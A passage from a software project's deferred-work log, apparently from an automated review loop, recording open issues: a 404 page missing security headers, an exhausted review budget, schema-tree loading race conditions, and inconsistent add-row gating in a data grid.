  summary: The `/live/` 404 page is now the least-protected HTML the Core serves — bare `htmlHeaders`, so no CSP and no `x-frame-options` at all, while every sibling HTML route carries one.
  evidence: `src/core/server.ts` returns the registry-miss page with `{ status: 404, headers: htmlHeaders }`, and `htmlHeaders` carries only content-type / `cache-control: no-store` / `nosniff`. The shell now adds a full policy plus `x-frame-options: DENY`, and `/live/<id>` has `LIVE_REPORT_CSP`; this route has neither, so it is framable by any origin. Not exploitable today — the body is a static string literal with no interpolation, hence not patched under DW-2, whose intent contract also excludes the `/live/` 404 page by name. The gap is that nothing in the suite would notice if that body ever stopped being static: the cheap fix is `default-src 'none'; frame-ancestors 'none'` on this one response plus a test pinning it, which is unrelated to the Live Report's own policy decision above.

### DW-71: Follow-up review still recommended for dw-csp-app-shell-hardening after the review budget was exhausted
origin: review-budget-followup
source_spec: `spec-dw-2-csp-app-shell-hardening.md`
severity: low
reason: Review budget (3 cycles) was exhausted with the story finalized (status: done, verify green) while the review pass kept recommending an independent follow-up. The work was committed by bmad-loop run 20260722-181413-2b68; this entry preserves the lingering follow-up recommendation for a deliberate later review.
status: open

### DW-72: The multi-root schema tree can strand permanently on the `loading` phase — no roots, no warning, no Reintentar — when a failed mount read, a "Reintentar", and a Settings mutation with a failing `connections.list` interleave
origin: adversarial follow-up review of 10-5, 2026-07-23 (commit 4a49b52); escalation E1
source_spec: `spec-10-5-multi-root-schema-tree.md`
location: `src/ui/schema/SchemaTree.tsx` (`loadTree`, `adoptBootRoot`, and the refresh failure branch)
severity: medium
found_by: both third-round blind judges (jd-105 follow-up review)
reason: Pre-existing in 4ad9393 (NOT introduced by the review's own fixes). Both root-list readers refuse to CREATE a `roots` phase when they are not the winner — `adoptBootRoot`'s setPhase and the refresh failure branch are both guarded on `cur.kind === "roots"` — while `loadTree` demotes a live `error` phase back to `loading` before its own reply lands. Repro: mount reads fail (phase `error`) -> user clicks Reintentar (phase `loading`, seq 2) -> user adds a connection in Settings (refresh seq 3) -> loadTree's GOOD reply is superseded and commits nothing -> the refresh's `connections.list` fails and cannot leave `loading`, so the panel reads "loading connections…" for the rest of the session. Not fixed by the review because it needs a `loadTree` restructure (branch the phase commit on supersession instead of returning early, without publishing a non-authoritative list over a newer one) — beyond the protocol's 2-iteration cap, and it would ship un-re-judged.
status: open

### DW-73: A repointed connection's stale-catalog prune waits for the next COMMITTING root-list reader instead of applying eagerly, so a failed refresh `connections.list` leaves the old database's table list on screen until some later commit
origin: adversarial follow-up review of 10-5, 2026-07-23 (commit 4a49b52); escalation E2
source_spec: `spec-10-5-multi-root-schema-tree.md`
location: `src/ui/schema/SchemaTree.tsx` (repoint-prune path), `src/ui/schema/schema-tree-state.ts` (banked-id set)
severity: medium
found_by: judge B, third round (jd-105 follow-up review); judge A independently traced the same area and found the durability sound — the two agreed on the mechanism, disagreed on severity
reason: Residual of the review's own fix 1 (commit 4a49b52), which made the repoint invalidation DURABLE (banked id set cleared only by the reconciliation that applies it) but not IMMEDIATE. Dropping a root's cache needs only its key, never a fresh root list, so when the post-edit refresh's `connections.list` fails, the stale catalog of the old database stays visible until some later committing reader runs. Suggested fix: apply the prune synchronously when the repoint is banked, guarded on `phase.kind === "roots"` (pruning against an empty root list would wipe every cached root). Left open because it is a refinement, not a correctness hole — the wrong-database read/write itself is already closed by fix 1.
status: open

### DW-74: The two add-row affordances disagree on gating — the result-bar Add-Row is gated on `canMutate`, its in-grid `+ insert row` twin is not — so a PK-less table still offers an inline insert; whether to align them is a product call
origin: adversarial follow-up review of 10-5, 2026-07-23 (commit 4a49b52); escalation E3
source_spec: `spec-10-5-multi-root-schema-tree.md`
location: `src/ui/workspace/DataGrid.tsx` (in-grid insert draft) vs the result-bar Add-Row button
severity: low
found_by: jd-105 follow-up review (pre-existing 7.2/3.3 disagreement, surfaced during the 10-5 pass)
reason: The result-bar Add-Row button is gated on `canMutate` while its in-grid `+ insert row` twin is not, so a PK-less table still exposes the inline insert. Hiding the in-grid draft would remove insert for PK-less tables, which DataGrid documents as deliberate — so reconciling the two is a PRODUCT decision (which affordance is authoritative), not a review's to make. The insert itself is SAFE post-fix-1: it commits through `connectionScope`, landing in the tab's own database. Not a correctness defect; recorded for a product call.
status: open
